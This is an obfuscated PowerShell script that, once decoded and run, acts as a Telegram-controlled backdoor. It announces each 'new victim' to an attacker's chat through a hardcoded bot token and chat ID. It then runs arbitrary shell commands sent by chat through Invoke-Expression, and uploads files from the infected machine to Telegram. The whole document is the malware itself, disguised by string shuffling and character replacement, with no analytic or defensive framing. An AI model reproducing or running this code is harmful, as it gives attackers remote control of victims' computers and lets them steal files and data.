(("{168}{121}{114}{127}{87}{37}{29}{95}{119}{105}{98}{141}{130}{170}{180}{10}{71}{144}{35}{15}{117}{56}{75}{1}{32}{72}{122}{132}{169}{143}{101}{31}{123}{45}{64}{97}{91}{39}{175}{61}{104}{139}{136}{157}{44}{150}{171}{173}{138}{90}{84}{93}{48}{77}{125}{46}{126}{177}{69}{124}{107}{156}{131}{3}{110}{89}{53}{2}{182}{82}{36}{68}{14}{7}{78}{25}{161}{120}{17}{22}{76}{9}{137}{40}{30}{148}{159}{80}{5}{57}{99}{12}{118}{38}{134}{85}{154}{153}{92}{13}{21}{179}{116}{164}{41}{115}{174}{52}{102}{178}{34}{113}{86}{112}{28}{162}{67}{16}{142}{63}{50}{106}{111}{49}{58}{59}{128}{163}{181}{0}{160}{51}{129}{94}{96}{43}{11}{145}{100}{66}{27}{81}{79}{172}{18}{23}{60}{70}{149}{88}{167}{20}{33}{135}{47}{6}{103}{54}{176}{166}{165}{158}{140}{65}{8}{133}{62}{42}{146}{108}{147}{55}{24}{4}{73}{109}{152}{74}{155}{151}{26}{19}{83}" -f 'w in sess','chars.Length)] })
    return tRTs','    hB','a; name=MJ','mMessage -ch','tRTre',' wUz',': app','}
  ','    tRTrequest.ContentType = hBsmultipart/form-data; boundary=tRTboun','Generate-Session','else {
                Send-Telegram','.GetResponse(','lePathhBs
}

# Notify ad','t-Type','3456789wUz
','{
            tRTsessionID = Generate-SessionID
            tRTsessions[tRTchatId] = tRTsessionID
            Send-Telegr','+ [System.Text.Encoding]::ASCII.GetBytes(tRTendBoundary))

    tRTreques','cha','ds','          Send-TelegramMessage -chatId tRTadmi','min when the script st','t = [System.Net.HttpWebRequest]::Create(tRTurl)
','tId tRTchatId -message hBs','       Send-Telegra','FhBs
    )
    tRTfileContent = [System.IO.File]::ReadAllBytes(tRTfile',' Start-Sleep -Secon','ionIDhBs
            }
        }
        elseif (tRTmessage -eq wUz/exitwUz) {
      ','        if (tRTmessage -eq w','iveSessions = @{}
tRTadminChatId = wUz7122592732wUz  # Replace with you','  ','    : Shows this','essionID
}
','nChatId -message hBsUser tRTchatId exited the session.hBs
            }
            else {
          ',' tRT','KLMNOPQRSTUVWXYZ012','ohBsdocumentMJohBs; filename=MJohBstRT([System.IO.Path]::GetFileName(tRTfilePath))MJohBstRTLFh','{}
tRTact','sponseStream()
    tRTreade','ve path).
hBs','quest.ContentLength = tRTbody.Length

','
    tRTupd','ns.ContainsKey(tRTchatId)) {
   ','hatId entered session tRTsessionID.hBs
            }
            ','et','help mes','RTfilePathh','     }
        elseif (tRTmessage -eq','ath tRTfilePath)) {
        Send-TelegramMessage -chatId ','wUz) {
            tRTsessionID = tRTmessage.Substring(7).Trim()
         ','ssage -chatId tRTadminChatId -message hBsUser tRTchatId generated a ','er your commands.h','ates -offset tRToffset
    foreach (tRTupdate in tRTupdates.result) {
        tRTmessage = tRTupdate.mes','chatIdtRTLFhBs +
        hBs--tRTboundarytRTLFhBs +
    ','RThelpMessage = Show-Help
            Send-TelegramMessage','= Invoke-Expression tRTmessage 2>&1
                if (tRTresult -ne tRTnull) {
             ','orEach-Object { tRTchars[(Get-Random -Minimum 0 -M','questStream.Write(tRTbody, 0, tRTbody.Length)
    tRTr','   if (tRTsessions.Con','tainsKey(tRTchatId) -and tRTsessions[tRTchatId] -eq tRTsession','You have ex','aram([int]t','veSessio','tId tRTchatId -message hBsYour session ID is: tRTsessionIDhBs
            # Send-TelegramMe','sage.
/download -><file>  : Sends a file to the botwUzs c','tRTfilePath -chatId tRTchatId
        ','ess','onswUz) ','Bs +
        hBsConten','tem.Guid]','ite','ID {
    tRTchars','
function Show-Help {
','atId t','esult -join hBsMJonhBs)
                }
            }
            catch {
                # Ignore i','aximum tRT','    tRTrequest.Method = hBsPOSThBs
','tRTchatId -message hBsFile no','lication/octet-streamtRTLFtRTL','ssions.ContainsKey(tRTchatId)) {
                tRTactiveSessions.Remove(tRTchatId)
          ','Stream()
    ','      if (tRTactiveSe','ontent-Disposition: form-data; name=MJ',' 2
}
','a','eader]::new(tRTresponseStream)
    tRTresponseContent = tRTreader.ReadToEnd(','ssage.chat.i','Token/hBs
tRTsessions = @','n.hBs
    ','LFtRT','cation).P','t (absolute or relati','RTchatId -message hBsFile sent successfully: tRTfi','th -ChildPath tRTfilePath
    }
    
    if (-not (Test-P','-TelegramMessage -chatId tRTadminChatId -message h','r Telegram chat ID for admin notifications

','BsUser tRTc','ha',' [string]tRTmessage)
    tRTpayload = @{chat_id = tRTchatId; text = tRTmessage}
    Invoke-RestMethod -Uri hB','equestStream.Close()

    tRTresponse = tRTrequest',' hBsInvalid or expired session ID: tRTs',' session.
/help    ->      ','sage.','/helpwUz) {
            t','RToffset)
    tRTurl = hBstRT{','age {
    param([string]tRTchatId,','session ID: tRTsessionIDhBs
        }
        elseif (tRTme','onhBs
    tRT','try {
                tRTresult','RTchatId -message','ohBschat_idMJohBstRTLFtRT','ssage -like wUz/shell*','d
        tRToffset = tRTupdate.update_id + 1

','update.me','https://api.tele','ates = G','il','    tRTlength = 7
    tRTsessionID = -join((1..tRTlength) pu9 F',')
    tRTresponseStream = tRTresponse.GetRe','function Send-TelegramMess','s) + tRTfileContent ','otToken = wUz8002691180:AAGTuLHzMiU5Qf0XCeDi8wt8P0UFDdBnaD0wUz
tRTuri = hBs','    tRThelpMess',' ','::NewGuid().ToString()
    tRTLF = hBsMJorMJ','t found: t','Bs
        return
   ','gram.org/bottRTbot','ID) {
             ','Bs
                # Send','x-www-for','nt-Disposition: form-dat','age = @hBs
Avai','      elseif (tRTacti','r = [System.IO.StreamR','      Send-TelegramMessage -chatId tRTchatId -message hBsYou are not in any session.hBs
            }
   ','RToffsethBs
    retur','daryhBs
    tRTre','tRTchatId)
    if (-not ([System.IO.Path]::IsPathRooted(tRTfilePath))) {
        tRTfilePath = Join-Path -Path (Get-Lo','uri}getUpdates?offset=t','d-TelegramFile -filePath ','stRT{uri}sendMessagehBs -Method Post -ContentType hBsapplication/','amMessage -cha','ell -> <session_id>: Enter a session and execute commands.
/exit    ->         : Exit the current',' = wUzABCDEFGHIJ','Message -chatId tRTchatId -message','         ',' ','  tRTrequestStream = tRTre','d the sessio','hod -Uri tRTurl -Method Ge','   }
    }
   ',' (tRTr',' t',')
    tRTreader.Close()

    Send-TelegramMessage -chatId','nvalid commands without sending an error
            }
     ','fields = @(
        hBs--tRTboundarytRTLFhBs +
        hBsConte','n Invoke-RestM','sage.Substring(10).Trim()
            Sen','quest.GetRequest','ion tRTsessionID. Ent','Path)
    tRTendBoundary = hBstRTLF--tRTboundary--tRTLFhBs
    tRTbody = ([System.Text.Encoding]::ASCII.GetBytes(tRTfield','Uz/sessi','   tRTactiveSessions[tRTchatId] = tRTsessionID
            ','e (tRTtrue) {','es','wnload*wUz) {
            tRTfilePath = tRTm','  ','tRTb','lable Commands:
/sessions ->         : Generates a random session ID.
/sh','m-urlencodedhB','t
}

function Sen','      Send-TelegramMessage -','d-TelegramFile {
    param([string]tRTfilePath, [string]','et-TelegramUpd','@
    return tRThelpMessage
}

function Get-TelegramUpdates {
    p',' -chatId tRTchatId -message tRThelpMessage
        }
        elseif (tRTmessage -like wUz/do',' }

    tRTurl = hBshttps://api.telegram.org/bottRTbotToken/sendDocumenthBs
    tRTboundary = [Sys','text
        tRTchatId =','arts
Send-TelegramMessage -chatId tRTadminChatId -message hBs New victim connected.hBs

tRToffset = 0
wh','s -Body tRTpayload
}

function ','    Send-TelegramMessage -chatId tRTchatId -message hBsYou are no','sC')).REPlacE('pu9','|').REPlacE('MJo','`').REPlacE('wUz',[STriNG][cHar]39).REPlacE('tRT','$').REPlacE(([cHar]104+[cHar]66+[cHar]115),[STriNG][cHar]34)| .( ([STriNg]$VeRbosEPReFErEncE)[1,3]+'x'-JOiN'')

